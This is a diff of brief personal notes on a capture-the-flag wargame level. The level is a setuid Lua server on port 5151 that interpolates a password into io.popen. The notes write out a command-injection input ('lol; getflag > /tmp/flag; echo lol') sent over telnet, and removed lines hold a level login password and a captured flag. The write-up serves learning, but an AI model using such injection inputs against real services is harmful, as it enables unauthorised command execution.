@@ -1,5 +1,6 @@
-- Connect with login: "level11" and password: "feulo4b72j7edeahuete3no7c"
+- ls -la <- setuid
 - read code -> lua server waiting for password
+	local server = assert(socket.bind("127.0.0.1", 5151)) <- on port 5151
 	prog = io.popen("echo "..pass.." | sha1sum", "r") <- string interpolation in popen exploit
 - ./level11.lua
 	lua: ./level11.lua:3: address already in use
@@ -10,5 +11,3 @@
 - telnet 127.0.0.1 5151
 - write -> lol; getflag > /tmp/flag; echo lol
 - cat /tmp/flag
-	fa6v5ateaw21peobuub8ipe6s
-
